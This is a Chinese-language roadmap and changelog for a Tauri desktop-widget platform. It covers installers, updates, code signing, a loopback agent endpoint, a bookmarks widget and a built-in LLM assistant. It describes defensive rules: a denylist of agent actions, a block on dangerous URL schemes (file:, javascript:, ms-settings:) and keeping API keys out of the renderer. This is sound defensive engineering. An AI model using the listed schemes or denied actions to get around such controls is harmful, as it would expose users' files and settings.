    - **存 `HH:MM`，不存"第几节"**：各校作息不同，存真实时刻让组件不需要一份"作息表"配置；有课早于 / 晚于配置范围时，整张卡自动撑开。
    - **重叠按簇分 lane**：A 9–11、B 10–12、C 11–13 通过 B 连成一簇，取最大并发数；三节同堂并排，不会出现半栏 / 整栏参差。
    - **奇偶周只在填了 `Term starts` 时生效**：没填就全部显示，不猜；周次用 UTC 日期戳做差，跨夏令时不会少一周。
    - **数据按 `widgetId` 共享**：和 todo / calendar 一样，所有 Timetable 是同一份课表；两份不同课表要换 id。没做 Excel / CSV 导入 —— 那要文件选择 + xlsx 解析，先用点击加课把本体跑通。
  - **本地目录和公开目录不同步**：`public/store/` 里现在是 14 个，`unraveltao/lattice-registry` 上还是 6 个。发上去要走 `npm run publish:widget -- public/widgets/<id> --key <私钥>`，然后在目录仓库提 PR —— 那是"作者发布流程写成文档"那条的活。

**明确不做**：账号、云端评分、下载计数、组件市场首页。这些全都要服务端，而 v0.5 的整个前提是"没有服务端"。评分和举报继续落本地文件（`reports/*.json`），作者自己收 —— 假装有云端比没有更糟。

## v0.7 —— 交付（进行中）

v0.5 让**组件**能分发，v0.6 让**目录**存在，但**平台自己**一直停留在"开发者机器上的 `npm run tauri:dev`"：没有安装包，装好之后也没法升级。这一节补的就是这两件事。

- [x] **NSIS 安装包** —— `npm run tauri:build` 出 `src-tauri/target/release/bundle/nsis/Lattice_<version>_x64-setup.exe`（本机实测 2.7 MB）+ 同名 `.sig`。和 `dev` 的区别不只是"能双击"：dev 的 exe 路径每次编译都变（所以自启的 `reconcile()` 只在 release 里修，见 v0.3 那条），dev 也不注入 CSP 头。
- [x] **平台自动更新** —— `tauri-plugin-updater` + GitHub Releases 的 `latest.json` + minisign 验签，设置菜单里多一行 **Check for updates**。密钥：`.keys/updater.key`（私钥，不进仓库）/ `tauri.conf.json` 的 `plugins.updater.pubkey`（公钥）。
- [ ] **代码签名** —— 没有证书，用户第一次运行会被 SmartScreen 拦成"未知发布者"，点"仍要运行"才装得上。**2026 年重新算过账：不买证书。** 完整论证在 [CODE_SIGNING.md](./CODE_SIGNING.md)，一句话版：EV 从 2024 起不再跳过 SmartScreen、Azure Artifact Signing 的个人开发者只限美/加、OV 一年一续且私钥必须进硬件 —— 付费唯一买到的是"发布者名字从'未知'变成你的"，而 SignPath Foundation 免费给同样的东西。原先这条写的是"要花钱买 OV/EV 证书"，那句话是错的。
  - [ ] **提 SignPath 申请** —— 免费 OV 级证书。它要求的四条我们全都有了：MIT（`LICENSE`）、公开仓库、`release.yml` 从 `v0.1.0` 起就在 `windows-latest` 上全自动构建、有已发布的 release。审核 1–3 个工作日。批准后 `release.yml` 加一步签名，**必须用 `vars.SIGNPATH_ORGANIZATION_ID != ''` gate 住** —— 没配就照常发未签名的包，别让一次审核卡住整个发布。
  - [ ] **验一次信任链** —— 有个中文博客说它链到私有根 `SignPath Root CA G2`、不在 Windows 默认信任库里，这和微软"OV-level certificate signing"的措辞对不上（另有第三方指南说是 DigiCert 签发）。三种说法都记在 CODE_SIGNING.md，**没证实，别当事实传**。签出第一个包后按文档里的 `Get-AuthenticodeSignature` + 一台干净 Windows 验一遍再定论。
  - [ ] **winget manifest** —— 不管签名成不成都要做。winget 下载的包不带 Mark-of-the-Web，用户根本不走"浏览器下载 → SmartScreen 拦"这条路，是免费方案里最接近"真的不弹警告"的一条。代价：每发一版都要改版本号 + 安装包直链 + SHA-256，重新提 PR。Scoop 可以顺带做，成本几乎为零。
  - [x] **release 附 SHA-256** —— 签名回答"谁做的"，哈希回答"有没有被换过"，未签名期间后者是唯一能给的。写在 `release.yml` 末尾，带 `continue-on-error`（编译完再判红太亏）。**下一次打 tag 才第一次真跑**，在那之前它只是写好了。
- [ ] **发布流程跑通一次** —— 打 tag → Actions 出草稿 release → 人工发布 → 旧版本点 Check for updates 能升上来。本地已经把"构建 → 签名 → 出安装包"跑通了，CI 那一侧也跑通了（`v0.1.0` 就是 Actions 出来的，2.67 MB 的 NSIS 安装包 + `.sig` + `latest.json`）。
  - **踩到一个坑，记在这里**：`v0.1.0` 发布时勾了 **"Set as a pre-release"**，而 `/releases/latest` 跳过的不只是草稿，还有预发布。于是 release 页面正常、产物都在、`releases/download/v0.1.0/latest.json` 也 200，**唯独更新器唯一会去敲的那个地址**（`releases/latest/download/latest.json`）是 404。
  - **症状比原因难查**：插件对任何非 2xx 都只记日志、最后统一抛 `Error::ReleaseNotFound`（"Could not fetch a valid release JSON from the remote"）—— 跟真断网**是同一句话**。前端原来把它当网络错误，界面上显示"检查你的网络"，而网络完全正常。现在 `describeUpdateError` 先认这一条再认网络（`tests/updater.html` 14 条断言钉着，含"别把 `TargetNotFound` 也归进来"）。
  - 修法：在 release 页面取消那个勾（或直接发下个版本时别勾）。代码侧没有更稳的办法 —— `latest` 这个别名就是这么定义的。

### 三条边界，别改

**一、只在用户点击时检查，不后台轮询。** 一个一年发几次版的项目，让每台机器每天替你发一次请求，换来的只是"可能早点知道"—— 而用户真正要问的是"我现在是不是最新的"，那是个点击动作。后台轮询还会让"更新失败"变成一个没人看着的静默错误。

**二、release 先出草稿。** `/releases/latest/download/latest.json` 只认**已发布**的 release。草稿期间更新器查不到任何东西（等于没发），点 Publish 那一刻全量生效。反过来（先发再验）就是"所有用户帮你做灰度"。

**三、装完必须 `restart()`，不是 `exit()`。** 新二进制只有新进程才会跑；更新完应用自己消失，在用户眼里就是更新失败。走的是自定义命令 `restart_app`（`app.restart()`），不是 `@tauri-apps/plugin-process` —— 少一个依赖，行为一样。

### 和组件更新的关系：两套，别混

| | 组件 | 平台 |
| --- | --- | --- |
| 清单 | `registry.json`（目录） | `latest.json`（release 附件） |
| 产物 | `.lattice`（zip，解压即用） | `.exe` / `.msi`（跑安装器） |
| 签名 | ed25519（`scripts/sign-widget.mjs`） | minisign（`tauri signer`） |
| 私钥位置 | 作者自己的机器 | `.keys/updater.key`（不进仓库）+ CI Secrets |
| 装法 | 解到 `%APPDATA%` | 覆盖安装 + 重启 |

共用的是"静态文件 + 签名 + 没有服务端"这套思路，代码路径一行都不重叠。把 `planInstall` 那套拿过来复用到平台更新上是不行的：安装包不是解压，是跑一个安装器。

## v0.8 —— Agent 接入（进行中）

"让 AI 调控桌面"这句话里有三件事，风险和工作量完全不同，顺序不能倒：**控制平面**（agent 摆组件、改主题、暂停）、**数据平面**（agent 读待办、加日历 —— 要改组件规范，波及所有作者）、**agent 当组件**（一块看板，不是聊天窗）。完整论证、协议表、威胁模型在 [AGENT_ACCESS.md](./AGENT_ACCESS.md)，这里只记决策和踩到的东西。

- [x] **控制平面** —— 一个只听 `127.0.0.1` 的 HTTP 端点，默认关，开的时候是人在设置里按的。`POST /rpc` 只有三个 op：`state`（读快照）/ `act`（改布局）/ `tool`（第二层占位）。动作白名单 8 个，全是可见可撤销的布局操作；`widget.grant` / `widget.install` / `config.set` / `state.clear` 这些写进 `DENIED`，连试都试不到。每次调用追加一行到 `agent/audit.log`。
  - **为什么是 HTTP 不是命名管道**：命名管道不开端口、不弹防火墙，但只有 Windows 客户端能用 —— 而 agent 宿主可能跑在 WSL 里、可能是 `curl`、可能是某个 Go 写的服务。HTTP 是唯一"任何东西都会说"的协议。代价用四道约束抵：只绑回环、端口取 0（系统分配，不撞车）、默认关、每个请求要 Bearer 令牌（常量时间比对）。
  - **关着的时候根本不 bind**，不是"绑上但拒绝"。端口开着就是开着了，拒绝逻辑写错一次就漏一次；而"绑上再拒"还会让 `endpoint.json` 一直存在，CLI 连上去看到一个永远 401 的端口。
  - **执行器必须在前端**。布局的权威在 `useLattice` 的内存状态里，`state.json` 只是整份覆盖的落盘副本（`state.rs`）。后端自己去改文件就会和内存那份打架 —— 这个项目已经被孤儿进程这么咬过一次。所以链路是 `HTTP → agent.rs → emit → platform/agent.ts 执行 → agent_reply`，后端**不解释结果**，前端给的 JSON 原样当响应体发回去。
  - **状态码只表达传输层的事**。`200` = 处理了（哪怕业务上失败）、`401` 令牌不对、`403` 动作在白名单外、`503` 窗口没答上来；业务失败用 `ok:false` + `code`。混在一起 agent 就分不清"重试有用"和"重试也没用"。
  - **白名单要改三处**：`agent_policy.rs` 的 `ACTIONS`、`platform/agent.ts` 的 `AGENT_ACTIONS`、文档那张表。`tests/agent.html` 第一条断言就把两张表逐字比一遍 —— 少改一处会红。
  - **测试分三块，各测各的**：`agent_policy.rs` 26 条（HTTP 解析的"没收全 / 畸形 / 超长"三态、Bearer、白名单、`say` 的单行化与超长拒绝、响应头）；`tests/agent.html` 57 条（跑的是**真 store**，不是替身 —— 用替身测等于只测了 if 分支）；`npm run test:agent` 14 条（起假端点，测 CLI 发出去的请求形状、`say` 的整句传递、失败时的退出码）。
- [ ] **数据平面** —— 组件清单加一节 `agent.tools`，agent 经平台调组件自己声明的方法。三个必须先回答的问题写在 AGENT_ACCESS.md §2.2：调**哪个实例**（`lattice.weather` 能同时摆三份）、**组件没在跑怎么办**（窗口不存在 / 被暂停 / 被完全挡住，桥不是定时器所以被挡住也能回，但窗口不存在时没人答）、**要不要单独的授权轴**（"允许天气组件联网"不等于"允许 agent 往里塞数据"）。一条原则：**agent 永远不碰原始存储**，要数据走组件声明的工具，平台不当数据出口。
- [x] **agent 当组件** —— 一个官方组件 `lattice.agent`，但**不是聊天窗，也不带模型**：没有 baseUrl、没有 API key、没有 `network` 权限、不碰网络，只读审计日志把"agent 说了什么、改了什么"列出来。当初的聊天窗方案要付三笔钱，第三笔最贵：组件的配置里存用户的 API key、`network.fetch` 的主机白名单因为用户能自己填 baseUrl 而形同虚设、**有嘴就有手**（一个能发请求的组件离"能改布局"只差一条桥方法，那条口子开出去收不回来）。而它要解决的问题是"我看不见 agent 在干什么"—— agent 宿主本来就有自己的界面，它只是**说不出话**。
  - **所以给它一条 `say`**：`{"op": "say", "text": "…"}` 是 agent 唯一的嘴，`agent.rs` 直接写进 `agent/audit.log`，**不走前端往返** —— 说一句话不需要等窗口答上来，窗口没开的时候这句话也该留下。两条约束：压成一行（审计日志是 JSONL，多行会把后面每一行拆坏）；**超长拒绝，不截断**（上限 500 字符 —— 截断等于替 agent 决定"后半句不重要"，而它会以为自己说完了）。
  - **看板骗不了人**：`act` 那几行是**平台**写的，`say` 那几行是 agent 自己的话，在数据里就是不同的 `op`。组件只负责显示，不解释、不执行、没有任何调用动作的接口 —— 它结构上做不了事，也就没法被诱导去做事。另外加了第七项权限 `agent:activity`：审计日志里有用户的操作历史，白给不合适。`agent` 关着时照样显示历史（发生过的事不会因为关掉开关就变成没发生过），只是不再有新行进来。
  - `tests/agent-widget.html` 50 条：加载真组件的 `widget.js`，调 `window.__latticeAgentFeed`，不复制一份逻辑去测。两个坑当场踩了：① `Math.max(1, Math.min(50, Math.floor(Number(-5)) || 10))` 里 `-5 || 10` 是 `-5`（truthy），负的 limit 会被夹到 1 而不是回到默认值 —— 归一化和夹紧要分成两步写；② 一开始用 `<iframe>` 装组件再顶层 `await` 它的 `load`，跑出来是 **0 条断言**：`--virtual-time-budget` 让虚拟时钟一路快进到 9 秒，而 iframe 的 `load` 走真实网络，谁先到看运气。**断言页别等 iframe**，`widget.js` 把纯逻辑挂在同步执行的那一段，普通 `<script>` 加载完就能断言。
- [ ] **真机验证一次** —— Rust 那半（监听、Tauri 往返、端口释放）**没跑过**，`cargo check` 干净不等于能跑。验之前先确认没有残留的 `lattice.exe`：孤儿进程会用内存里那份盖掉 `state.json`。

**明确不做（v1）**：后台自主调控。"每天按天气自动换主题"需要常驻订阅，而人在环（用户说一句、它做一次）和无人环是两套完全不同的安全模型。先把有人的那条做顺。

## v0.9 —— 声音看得见、链接出得去（已完成）

- [x] **`lattice.media` 改名 `lattice.music`** —— 组件一直叫"Now Playing"、id 叫 `lattice.media`，两个名字都不对：它做的第一件事是"现在放的是什么"，第二件事才是"有多响"。现在 id / 目录 / 说明全叫 Music。**改名不是零成本的**：老用户的 `state.json` 里那条 `lattice.media` 会变成"找不到的组件"，桌面上的卡片消失，要重新从组件库拖一次 —— 这个平台没有 id 迁移机制，也不该为一次改名发明一个（迁移表要永久维护，而它解决的是一次性问题）。
- [x] **播放器名翻成人话** —— SMTC 的 `source` 是 **AUMID**（`Spotify.exe`、`Microsoft.ZuneMusic_8wekyb3d8bbwe!Microsoft.ZuneMusic`），原样摆在卡片上就是 `SPOTIFY.EXE`。这是"这组件看着就坏了"的第一来源：数据没错，但没人认得那串东西。翻译放在组件里（`sourceLabel`，纯函数，`tests/music.html` 钉着 9 条），不放后端 —— 后端只该给事实，怎么显示是组件的事。
- [x] **卡片重新排版** —— 老版按 268×148 排到最后一像素（21+22+37+19+26+21 = 146），四舍五入差一点就把那排按钮顶出卡片，而 `overflow: hidden` 让它**静默**被切掉。新版 268×172：曲名占第一行（自己让出窗饰那 120px，省掉一条标题栏），折线拿走剩下的高度，`minH` 152 是按"折线至少 26px"倒算出来的。**教训**：卡片尺寸不是设计稿，是预算 —— 把每一项的高度写进 CSS 注释，比事后量着调快。
- [x] **声音高低那条线（`audio.level`）** —— 用户要的是"像心电图一样的折线"。SMTC **没有音量**（只有标题、歌手、进度），所以唯一的路是自己去听输出设备：WASAPI 的**回环采集**（`AUDCLNT_STREAMFLAGS_LOOPBACK`），`audio.rs` 一个常驻线程每 40ms 读一块、算个 RMS、写进一个 `f32`，命令只负责读那个数。
  - **权限是单独一项 `audio:level`，没搭 `media:control` 的便车**。读会话拿的是歌名歌手，这条线拿的是**正在播出来的声音本身**；并在一起的话，一个组件只要说"我要控制播放"就顺带拿到了"听你电脑在放什么"。授权面板上那行字不该替用户做这个决定。八项权限至此全齐 —— 第九项 `shell:open` 是收藏夹逼出来的，见下面那条。
  - **分贝不是线性**：正常听歌的 RMS 在 0.02..0.15，直接当 0..1 用那条线永远贴着底。取 `20·log10(rms)` 把 -60dB..0dB 铺满 0..1，再叠一条 120ms 时间常数的释放曲线（峰值立刻起、慢慢落）—— 太快像噪点，太慢糊成包络线。
  - **采集线程常驻、命令同步**：一次 `Initialize` 十几毫秒，按调用现开现关会让线一顿一顿；命令只锁一个 f32，没有阻塞，丢进 `spawn_blocking` 反而多一次线程切换。
  - **设备出错不是错误**：拔耳机、切默认设备、被独占 → `running: false` + `level: 0`，睡两秒重连。组件画平线，不弹红字 —— 那本来就是"现在没声音"的诚实画法。
  - 采样间隔 80ms，比调度器 250ms 的下限密，所以组件用它自己的 `setInterval`（要的是传感器读数，不是平台要保持的节奏）；滚动平滑靠 `requestAnimationFrame` 在两次采样之间插值，**但"有数据就有线"不靠它** —— 拿到采样先画一次 `fraction 0`，窗口被节流时线也不会停在上一帧。
- 验证：`tests/music.html` **66 条**（原 `tests/media.html` 33 条），`audio_policy.rs` 6 条 `rustc --test`，`npm run typecheck` 干净。WASAPI 那半边只有真机能验，本机没有媒体会话（`GetCurrentSession` 返回空），所以"有歌在放"的样子是**用真机 + 真声音**验的，不是靠单测。

- [x] **收藏夹（`lattice.bookmarks`，15 个官方组件）** —— 用户要的是"像浏览器那样收藏网址"。卡片是一列书架：点一行交给系统浏览器打开，粘贴一条按回车就收进来，每行能改名（`F2` 或那支铅笔）、能删。权限只两项：`storage`（自己那份清单）和 `shell:open`（第九项，见下一条）。
  - **组件侧只负责"存下来的东西是干净的"**：`github.com` → `https://github.com/`、`example.com:8080/x` 认成"主机 + 端口"、`//host/x` 补 `https:`。这不是安全边界（边界在 `open_policy.rs`），是为了让书架上写的东西和它真会打开的东西一致 —— 一行写着 `example.com`、点开是 `https://example.com/`，看不出差别最好，看得出就别扭。
  - **去重按归一化之后的地址**，不按用户的原文：同一个站从地址栏复制、从别处粘贴会带不同的尾巴（末尾斜杠、主机大小写、`?utm_*`），按原文比对等于书架里能存三份同一个站。上限 100 条 —— 这是"收藏夹"不是"书签数据库"，无限收集只会让滚轮转半天。
  - **不读剪贴板**：平台没有 `clipboard.read`，也不该有 —— 剪贴板里可能是密码。用户自己往输入框里粘，组件只读那个输入框。
  - **不抓 favicon**：`network.hosts` 是逐主机白名单，一个"什么网址都收"的书架没法预先声明主机；要抓就得给组件开通用网络权限，或者维护一份假清单。所以行首是首字母色块（`tintOf` 由主机名算色相），标题缺省取主机名、可以手改 —— 比一个转圈加载的灰方块诚实。
  - `sort`（最近 / 名字 / 主机）和 `showHost` 走清单 `config`，两行字的行高 33px，第二行（主机名）可关。行高不是拍脑袋来的：280×300 的默认卡片扣掉标题 22 + 输入框 28 + 三处 12/7 的间距，正好剩 212px，33×6 + 2×5 = 208 是六个整行 —— 第一版按 36px 排，第六行会被卡片底边切掉一条，量一次才发现（那 30px 只是 `min-height` 的下限，不是行高）。
- [x] **第九项权限 `shell:open`** —— 收藏夹是第一个**需要往外递东西**的组件，而平台此前没有任何办法让组件打开一个链接：`egress.rs` 把组件自己的帧导航全拦了（那是防数据外泄的一半），`tauri-plugin-opener` 只给主窗口用。加这道门要先回答"往外交地址"和"组件不许出网"为什么不冲突：前者是用户点了某一行、地址交给浏览器；后者是组件自己开一个帧把数据拼进 URL 送出去 —— 那扇门仍然关着，`egress.rs` 一行没改。
  - **`open_policy.rs` 才是边界**。`tauri-plugin-opener` 把字符串原样丢给 `ShellExecuteW`，而它**不认协议**：`file:` 会把本地文件交给默认程序打开，`ms-settings:` 能翻到系统隐私页，`search-ms:` 和任何注册过的自定义协议一样照办。所以只有 http/https 放行，其余（含 `javascript:` / `data:` / `vbscript:` / `mailto:` / `ftp:`）一律拒；超过 2048 字符、带空格的"地址"也拒。
  - **补协议头像地址栏，不是自作聪明**：`example.com` 补成 `https://example.com/`，`example.com:8080/x` 认出"主机 + 端口"而不是"协议 `example.com:`"。规则写成纯函数，5 条 `rustc --test` 钉着；组件里那份 `normalizeUrl` 是同一张用例表的 UX 版，两边要一起改。
  - **权限没授予时返回结构化错误**（`permission_denied`），组件把它显示成一句"给它 Open links 就能点开"，不是弹红字 —— 和 `network.fetch` 同一个形状。
  - 验证：`tests/bookmarks.html` **44 条**（归一化 / 增 / 删 / 改名 / 排序 / 脏存档不写回 / 存储广播 / 权限被拒），`open_policy.rs` 5 条 `rustc --test` 全过，`npm run typecheck` 干净，全量自检 **36 页 / 1357 条 / 0 failed**。真机那条（点一行真的弹出浏览器、权限关掉之后点不动）**还没走**：`ShellExecuteW` 只有桌面上能验。

- [x] **系统卡片补细节（`lattice.sysmon` 0.2.0）** —— 用户原话是"就两个数值不太行"。0.1.0 只有 CPU 42% / 内存 81% 两个大数字加四个小数字，回答不了三个真问题：刚才是不是卡了一下、是哪个核在忙、内存还有多少余量。
  - **折线是历史，不是装饰**。一分钟 60 个采样，CPU 带填充、内存走虚线，两条共用 0–100% 的坐标，所以"CPU 偶尔尖一下"和"内存慢慢涨上去"一眼分得开。缓冲只有 10 个点时线**只占右边一小段**（间距按容量算、从右端往左排）—— 撑满整幅的话，"刚打开"和"一条平线"看起来一模一样。
  - **第一拍不进历史**。速率类指标后端第一次一定返回 0（没有前值），那一拍要是进了缓冲，折线最左边永远挂着一个假的坑。
  - **逐核条回答"是哪个核在忙"**：16 核机器上整机 6% 可能是"一个核跑满"，也可能是"真闲着"，整机数字分不出来。数据来自 `NtQuerySystemInformation(SystemProcessorPerformanceInformation)`（PDH 要走计数器路径、WMI 更重），口径和 `GetSystemTimes` 一样 —— kernel 含 idle，忙 = kernel + user − idle。**核数变了就返回空数组**，组件把那一行收起来：按索引硬对会把 A 核的计数减到 B 核头上，画出来是一条看着合理、其实全错的曲线。
  - **提交量才是"要出事"的那个数**：物理内存满了系统只是变慢，撞到提交上限会**直接拒绝分配**。`GetPerformanceInfo` 的 `CommitTotal` / `CommitLimit` 单位是**页**不是字节，忘了乘 `PageSize` 会小 4096 倍（同一个结构体里 `ProcessCount` 又是计数、不用乘 —— 抄字段要一个字段一个字段看）。
  - **差分搬进了 `metrics_policy.rs`**：`metrics.rs` 全是指针和 Win32 调用，`rustc --test` 编不进来；"两次累计计数之间忙了多少"恰好是这里唯一会算错的地方（除零、计数器回绕、核数变了），拆出来才测得到。整机和逐核现在走同一个 `usage()`，口径不会再分叉。
  - **尺寸是算出来的，不是试出来的**：12+22+6+20+6+折线+6+38+6+16+6+40+12 = 190 + 折线，240 高时折线拿 50px、`minH` 210 时还有 20px。缩到最窄（220）时标题栏扣掉窗饰只剩 76px，`@media (max-width: 244px)` 先把开机时长藏掉 —— 别把 "System" 截成 "Sy…"，名字被截比少一个数更像坏了。
  - 验证：`tests/sysmon.html` **57 条**（原 10 条，加了折线几何、逐核、老后端缺字段、权限被拒），`metrics_policy.rs` 5 条 `rustc --test`，`npm run typecheck` 干净，全量自检 **36 页 / 1401 条 / 0 failed**。

## v0.10 —— 内置 assistant（进行中）

起因是一句用户原话："我项目的 agent 是有问题的，我需要的 agent 是像你这种的 model 可以导入、可以调用 api 的 key 的。" 说得很准：v0.8 的 agent 只有**手**（回环 HTTP 端点 + 8 个动作），没有**嘴** —— 想让它动一下桌面，得先在外面跑一个自己的模型、再写一个客户端。v0.10 把嘴装进平台，手仍然是原来那八只。

- [x] **推翻"agent 只给嘴不给手"**。当初的理由是"模型会过时，平台不该内置"，那条仍然成立；被推翻的是它的推论"所以平台不该有模型"。正确的形状是**平台带插槽，用户带模型**：没有内置模型、没有代理、没有默认端点你不需要输入，但模型和 key 是平台自己的设置项，不是第三个程序。论证见上面「被推翻的九个决定」第 9 条。
- [x] **协议只认 OpenAI 兼容的 `/chat/completions`**。不为每家写适配器（那会变成一份永久追着别人改的翻译层），也不支持自研协议。`normalize_base` 负责把用户粘进来的东西收拾成 base URL：补 `https://`、去尾斜杠、剥掉顺手带的 `/chat/completions` `/completions` `/models`；`http://` 只放回环 —— 明文把 key 发出去这件事，不该靠用户记得自己加 `s`。IPv6 回环（`[::1]:8080`）要拆括号再判，`split(':')` 会把它判成"不是回环"而拒掉一个合法地址。
- [x] **key 落在 Rust 掌管的 `assistant.json`，不进渲染进程**。`llm_status` 只回 `sk-1…cdef` 这样的掩码和 `keySource`（`file` / `env`），`llm_chat` 在 Rust 里拼 `Authorization`。为什么不放 `state.json`：那份是前端整体回写的，两个入口（抽屉、组件宿主）会互相盖；更要紧的是，把 key 交给渲染进程等于任何一个组件 XSS 都直接拿到它 —— 而组件本来就是不可信代码。环境变量 `LATTICE_LLM_KEY` / `_BASE_URL` / `_MODEL` 可以盖掉文件，给 CI 和临时试验用。
- [x] **手仍然是那八个动作，而且只有平台能用**。工具表在 `runtime/assistant.ts`（名字、参数名、类型、`required`），执行仍是 `runtime/agent.ts` 的 `AGENT_ACTIONS` —— 两张表由 `tests/assistant.html` 钉着"名字集合相等、参数键与执行器的 `EXECUTOR_KEYS` 对得上"。循环上限 6 步（Rust 侧还有 8 步的硬闸），每步把执行器回的 JSON 当 `tool` 消息回填，用户点停止立刻断。**授权、安装、卸载、改配置、写存储一律不在工具表里**：让模型能改权限，等于让一段提示词决定"信不信任这段代码"。
- [x] **组件只有嘴：`llm.chat` 一律 `tools: null`**。第十项权限 `llm:chat`（"Use my AI model"）换到的是一段文字，不是一双手 —— 模型真回一个工具调用，桥把它变成 `internal` 错误。桌宠是第一个用它的人（`lattice.pet` 0.6.0）：她能在自己的气泡里说话，但她动不了自己的位置。这条是不变量 2 的延伸：**能改变桌面的是平台，不是组件。**
- [x] **错误要分得清是谁的错**。401/403 → "provider 拒了这把 key（HTTP 401），去 Assistant settings 换一把"；404 → 提一句 `/v1` 大概是漏了；429 → 配额。统一说"网络问题"是拿更新器换来的教训（不变量 16），这里不重犯。响应体上限 512KB、请求节流 300ms、消息 60 条 / 单条 12k 字 / 合计 60k 字，都是为了"用户手滑粘一整本书"和"provider 收钱按 token"。
- [x] **从"主窗口的抽屉"变成"桌面上的一扇小窗"**。抽屉的前提是你正看着平台；可 assistant 要做的事恰恰是"我不看平台的时候让它动一下"。现在 Ctrl+K 叫出来的是一扇无边框、400×580、能拖的独立窗口（独立入口 `assistant.html`，**不加载平台外壳也就不加载 store**），不置顶 —— 叫它出来而不是永远压着你；✕ 只是 `hide()`，webview 和那一轮对话都留着；位置在拖动结束时才写 `assistant-window.json`。三条撞出来的：
  - **三个窗口命令必须是 `async fn`**。同步命令跑在主线程，而 `build()` 要把建窗口投递回主线程再等结果 —— 表现是整个应用卡死（连托盘都不响应），不是"窗口没出来"。
  - **小窗不能自己跑执行器**。`state.json` 不是状态，它是主窗口那份 store 的磁盘副本；小窗拿启动时的快照跑一遍 `AGENT_ACTIONS` 再写回去，等于把主窗口期间的所有改动（新摆的组件、换过的主题）整块盖掉。所以 `platform/assistant.ts` 抽出 `AssistantSurface`：抽屉 `localSurface(records)` 本地跑，小窗 `remoteSurface()` 把 `assistant_snapshot` / `assistant_act` 交给 `agent.rs`，走 agent 端点**同一条** `call_frontend` 通道，动作照旧先过 `agent_policy` 的白名单。工具循环一行没分叉。
  - **capability 里要显式开 `start-dragging`**，否则标题栏拖不动，而且失败是静默的（`startDragging()` 的 Promise 直接 reject）。
- [x] **看板不再把 assistant 那几行当成看不懂的行**。`lattice.agent` 0.2.0 的 `describe()` 开始认 `op === "assistant.chat"`：从审计的 `detail` 里取出 `tools: placement.move` 这类字段，翻译成 "assistant · moved a widget"，没有工具的那几轮仍按 `say` 显示。改之前这些行被整条滤掉 —— 而"谁动了桌面"正是这块看板存在的理由，滤掉它等于把内置 assistant 做的事藏起来。`tests/agent-widget.html` +7 条钉着。（这块看板在本版末尾连包一起删了，见下一条。）
- [x] **平台界面中英双语，一句文案只写一处**。用户的原话是"添加个中英文翻译的功能，我要统一下语言"。选的是**英文原句当 key**（gettext 那套），不是 `settings.snap` 这种点分键：缺一条翻译时界面退化成那句英文，而不是露出一串键名 —— 这张表是边写边漏的，漏一条的代价必须只是"这句还是英文"。中文按域分七片（`runtime/i18n/*`，纯数据、不许 import），设置里三档（中文 / English / 跟随系统），落的盘是**偏好**不是结果 —— 存结果的话，用户哪天换了系统语言，界面不会跟着变。四条撞出来的：
  - **模块顶层算出来的常量数组不能直接 `t()`**。`THEME_OPTIONS` 那种写在模块作用域里，`t()` 在 import 那一刻就求值了，切语言不会更新。英文留在常量里，渲染时 `t(option.label)`。
  - **偏好变了、生效语言没变，也要通知订阅者**。系统是中文时，"中文"和"跟随系统"解析出来是同一个语言、界面上一个字都不变；只按"语言变了"通知的话，用户点那一下看不到任何反应。
  - **桌面窗口读不到这档偏好**。`widgetHost.ts` 是独立 webview、**不加载 store** —— 让它自己用 `navigator.language` 猜一遍，就会出现"界面已切成英文、桌面卡片上的提示还是中文"。所以语言随 `HostConfig.lang` 下去当初值、变化走 `lattice:language` 广播，和 `lattice:theme` 同一个形状（这两条是仅有的两条**故意全局**的事件，见不变量 9）。
  - **权限名要走 `permissionLabel()`**。`PERMISSION_LABELS` 是英文原文，同时也是中文表的 key —— 界面上直接读它，中文环境里权限列表就永远是英文。
  - 边界：组件清单里那些字（`name` / `description` / `config` 标签 / `help` / `changelog`）**不进这张表** —— 它们是作者写的，跟着包和签名走，平台没有理由认识第三方组件的每一句话；它们怎么双语见下一条；`tests/i18n.html` 钉住"分片都在 / 占位符两边一致 / 同一句没有两种译法 / 偏好变了要通知"。**已知缺口**：Rust 侧直接生成的那几句给人看的话（`llm.rs` 的"key 只在 Rust 里"那几条、`llm_policy::describe_status` 的 401/404/429）还是英文 —— 它们跨过 IPC 才到界面，进中文表要先在 Rust 里认一遍 key，这一版没做，先记着而不是假装没这回事。
- [x] **组件的字也跟着换语言**。上一版把**平台**的字统一了，可桌宠叫"大肥鱼"、气泡里写"说点什么…"—— 界面切成英文，她还是中文的。用户指出的正是这条缝。两半一起补：
  - **清单里能写两门**：`name` / `description` / `config[].label` / `.help` / `.placeholder` / `options[].label` / `help[].title` / `help[].items[]` / `changelog[].changes[]` 都接受 `{ "zh": …, "en": … }`，平台按当前语言挑（`runtime/widget-text.ts` 的 `normalizeText` / `pickText` / `textVariants`）。**单字符串永远有效**，只写一门的第三方组件照旧能用，缺的那门**退到另一门**而不是空白 —— 和 `t()` 缺翻译退成英文同一个取舍。上限按门各算，写坏一门只丢那一门。
  - **HTML 里的字由组件自己挑**：桥加了 `lang.get`（不要权限，返回 `{ lang, locale }`）和一条 `language` 推送。两个宿主都在 `ready`、iframe `load`、语言变化三处推 —— 只读一次的话用户换语言组件不动，只听推送的话组件停在建文档那一刻（重载、热更新都会碰上）。SDK 把它包成 `lattice.language` + `lattice.on("language")`，启动时自动拉一次。
  - **桌宠整只双语**：清单里那 175 行文案（名字、说明、三项配置、三节说明、八条变更记录）全部写成两门，抬到 0.8.0 并按不变量 17 补了 changelog；`pet.js` 里气泡标题、`发送`、`收起`、输入提示、她那几句"我还不会说话"都按 `say(zh, en)` 挑。换语言时**已经说出口的那些提示行原地换掉**（模型说的话不换 —— 那不是作者写的）。
  - 顺手补的两个坑：**搜索要两种语言都建索引**（`textVariants`），否则英文名在中文界面里搜不到；**商店索引脚本**拿字段当字符串排序会在双语条目上抛错（`localeCompare` 不在对象上），挑一门再排。
- [x] **删掉一块没什么用的官方组件：`lattice.agent`**。用户原话："widgets 里的 now playing 和 agent 没有什么作用，是可以删除的。" —— 但那句里的"now playing"**不在这个仓库**，见第一条连带。`lattice.agent` 只念审计日志，而终端里 `npm run agent -- state` 一行就到手，删的是**组件包**（连 `tests/agent-widget.html` 57 条一起），**不是那条口子**：`agent.activity` 与 `agent:activity` 权限仍在 `WIDGET_SPEC` 的方法表里 —— 那是写给第三方组件的公开面，谁想自己画一块日志看板都还能用。（同一句话里被点到的音乐组件**留了下来**：用户随后明确"music 是我需要的组件"，包和 `tests/music.html` 66 条一起恢复。）
